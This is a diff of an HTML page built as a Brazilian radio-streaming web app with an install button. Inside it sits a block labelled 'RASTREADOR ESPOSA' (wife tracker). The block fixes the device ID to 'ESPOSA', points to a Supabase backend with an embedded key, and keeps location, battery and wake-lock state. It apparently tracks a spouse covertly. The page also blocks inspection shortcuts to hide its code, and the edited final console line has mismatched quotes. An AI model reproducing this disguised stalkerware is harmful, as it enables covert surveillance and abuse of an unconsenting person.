@@ -152,7 +152,6 @@ html.big .footer{font-size:clamp(10px,1.2vmin,13px);margin-top:12px}
 html.tv .side-col,html.tv .footer{display:none!important}
 @media(min-width:800px) and (max-height:660px){html.big .footer{display:none}}
 .lock{position:fixed;bottom:4px;right:6px;z-index:99;font-size:9px;opacity:.35;letter-spacing:1px;pointer-events:none}
-/* BOTÃO FIXO SEMPRE VISÍVEL */
 #installFixed{position:fixed;left:50%;bottom:calc(12px + env(safe-area-inset-bottom));transform:translateX(-50%);z-index:200;width:min(360px,92vw);display:none}
 #installFixed.show{display:block}
 #installFixed button{width:100%;padding:16px;border-radius:999px;border:2px solid #fff;cursor:pointer;font-family:inherit;font-weight:900;font-size:15px;letter-spacing:1px;color:#fff;background:linear-gradient(135deg,#ff9500,#ff2d55);box-shadow:0 12px 34px rgba(255,45,85,.55);animation:pulseBtn 1.6s infinite}
@@ -180,7 +179,7 @@ html.tv .side-col,html.tv .footer{display:none!important}
 <div id="installFixed"><button id="installBtnFixed">⬇ INSTALAR APP NA TELA INICIAL</button></div>
 <div class="tv-warn" id="tvWarn"><b>📺 Smart TV detectada.</b> Abra pelo navegador da TV, não pelo Downloader. <button id="tvWarnClose">OK</button></div>
 <div id="volToast">VOL 80%</div>
-<div class="lock">🔒 ESPOSA v2.2 TRAVADO - BOTÃO FIXO</div>
+<div class="lock">🔒 ESPOSA v2.3 TRAVADO</div>
 <audio id="audio" src="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3" preload="auto" autoplay controls playsinline></audio>
 <script>
 'use strict';
@@ -239,7 +238,7 @@ function renderResults(list){qResults.innerHTML="";if(!list.length){var p=docume
 qBtn.addEventListener("click",runSearch);qInput.addEventListener("keydown",function(e){if(e.key==="Enter")runSearch()});
 (function(){var eq=document.getElementById("eq");for(var i=0;i<20;i++){var b=document.createElement("i");b.style.animationDuration=(0.5+Math.random()*0.7)+"s";b.style.animationDelay=(Math.random()*0.4)+"s";eq.appendChild(b)}})();
 
-/* ===== BOTÃO INSTALAR TRAVADO v2.2 - FIXO EMBAIXO, APERTA -> INSTALA -> SOME ===== */
+/* ===== BOTÃO INSTALAR TRAVADO v2.3 - FIXO EMBAIXO, APERTA -> INSTALA -> SOME ===== */
 var diagEl=$("diag");
 function showDiag(html){if(!diagEl)return;diagEl.innerHTML=html;diagEl.classList.add("show")}
 function hideDiag(){if(diagEl)diagEl.classList.remove("show")}
@@ -279,7 +278,6 @@ function clicarInstalar(){
       if(IS_IOS){ installHelp.innerHTML="💡 <b>iPhone:</b> Compartilhar → <b>Adicionar à Tela de Início</b>"; }
       else { installHelp.innerHTML="💡 <b>Instala por aqui:</b><br>1. Aperta os <b>3 pontinhos ⋮</b> do Chrome<br>2. Aperta <b>Instalar aplicativo</b><br>3. Aperta <b>Instalar</b>"; }
     }
-    // Rola pra mostrar a dica
     try{ installHelp.scrollIntoView({behavior:"smooth",block:"center"}); }catch(e){}
   }
 }
@@ -301,7 +299,9 @@ else if(mqStandalone.addListener) mqStandalone.addListener(onStandaloneChange);
 if(IS_TV&&tvWarn){var __ua=navigator.userAgent||"";var isWebView=/\bwv\)/i.test(__ua)||/Downloader/i.test(__ua);if(isWebView){tvWarn.classList.add("show");var c=$("tvWarnClose");if(c)c.addEventListener("click",function(){tvWarn.classList.remove("show")});setTimeout(function(){tvWarn.classList.remove("show")},15000)}}
 if("serviceWorker" in navigator){window.addEventListener("load",function(){navigator.serviceWorker.register("service-worker.js").then(function(){dbg("SW OK")}).catch(function(e){dbg("SW erro: "+e.message)})})}
 setInterval(function(){if(state.playing)pollNow()},POLL_MS);
-const DEVICE_ID_ESPOSA=new URLSearchParams(location.search).get('id')||'ESPOSA';
+
+/* ===== RASTREADOR ESPOSA TRAVADO - SEMPRE ESPOSA, NUNCA CARRO ===== */
+const DEVICE_ID_ESPOSA='ESPOSA';
 const SUPA_URL="https://jpaflbkafupwqfqfcjrv.supabase.co";
 const SUPA_KEY="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
 let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_wakeLock=null,_rastreiou=false;
@@ -320,7 +320,7 @@ document.addEventListener('contextmenu',e=>e.preventDefault());
 document.addEventListener('selectstart',e=>{if(e.target.tagName!=='INPUT')e.preventDefault()});
 document.addEventListener('keydown',e=>{if((e.ctrlKey&&['u','s','c','a'].includes(e.key.toLowerCase()))||e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['i','j'].includes(e.key.toLowerCase())))e.preventDefault()});
 Object.freeze(DEVICE_ID_ESPOSA);
-console.log('%c🔒 Criado por EliasCosta NEGRET'S','color:#ff2d55;font-weight:bold;font-size:16px');
+console.log('%c🔒 Criado por Elias costa NEGRET'S,'color:#ff2d55;font-weight:bold;font-size:16px');
 </script>
 </body>
 </html>
